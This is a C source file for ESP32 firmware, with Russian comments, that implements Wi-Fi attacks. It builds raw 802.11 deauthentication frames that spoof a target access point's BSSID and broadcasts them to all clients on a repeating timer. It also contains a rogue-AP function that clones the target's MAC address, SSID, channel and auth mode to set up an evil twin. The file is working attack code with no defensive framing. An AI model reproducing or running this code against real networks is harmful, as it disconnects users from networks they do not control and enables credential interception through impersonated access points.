#include "attack_method.h"
#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "wifi_controller.h"

static const char *TAG = "attack_method";
static esp_timer_handle_t deauth_timer_handle;
static bool timer_running = false;

// 802.11 Deauth frame: RA=broadcast, TA+BSSID=AP mac, reason=1
// Байты 10..15 = TA (source), 16..21 = BSSID — заполняем BSSID цели
static const uint8_t deauth_frame_tpl[] = {
    0xC0, 0x00,                          // Frame Control: Deauthentication
    0x00, 0x00,                          // Duration
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,        // RA: broadcast (все клиенты)
    0x00,0x00,0x00,0x00,0x00,0x00,        // TA: AP BSSID (заполним)
    0x00,0x00,0x00,0x00,0x00,0x00,        // BSSID: AP BSSID (заполним)
    0x00,0x00,                           // Sequence Control
    0x01,0x00                            // Reason: Unspecified
};

static void send_deauth_raw(wifi_ap_record_t *ap){
    uint8_t frame[sizeof(deauth_frame_tpl)];
    memcpy(frame, deauth_frame_tpl, sizeof(frame));
    // Вставить BSSID как source и bssid
    memcpy(&frame[10], ap->bssid, 6);
    memcpy(&frame[16], ap->bssid, 6);
    // Переключиться на канал цели
    esp_wifi_set_channel(ap->primary, WIFI_SECOND_CHAN_NONE);
    // Отправить raw 802.11 фрейм — это и есть настоящий deauth
    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
}

static void timer_send_deauth_frame(void *arg){
    send_deauth_raw((wifi_ap_record_t *)arg);
}

void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec){
    if(timer_running){
        esp_timer_stop(deauth_timer_handle);
        esp_timer_delete(deauth_timer_handle);
        timer_running = false;
    }
    const esp_timer_create_args_t args = {
        .callback = &timer_send_deauth_frame,
        .arg = (void *)ap_record,
        .name = "deauth"
    };
    ESP_ERROR_CHECK(esp_timer_create(&args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, (uint64_t)period_sec * 1000000ULL));
    timer_running = true;
    ESP_LOGI(TAG, "Deauth broadcast started, period=%us, BSSID=%02x:%02x:%02x:%02x:%02x:%02x ch=%d",
             period_sec,
             ap_record->bssid[0],ap_record->bssid[1],ap_record->bssid[2],
             ap_record->bssid[3],ap_record->bssid[4],ap_record->bssid[5],
             ap_record->primary);
}

void attack_method_broadcast_stop(){
    if(timer_running){
        esp_timer_stop(deauth_timer_handle);
        esp_timer_delete(deauth_timer_handle);
        timer_running = false;
        ESP_LOGI(TAG, "Deauth broadcast stopped");
    }
}

void attack_method_rogueap(const wifi_ap_record_t *ap_record){
    wifictl_set_ap_mac(ap_record->bssid);
    wifi_config_t cfg = {
        .ap = {
            .ssid_len = strlen((char*)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .password = "dummypassword",
            .max_connection = 1
        },
    };
    memcpy(cfg.ap.ssid, ap_record->ssid, 32);
    wifictl_ap_start(&cfg);
}
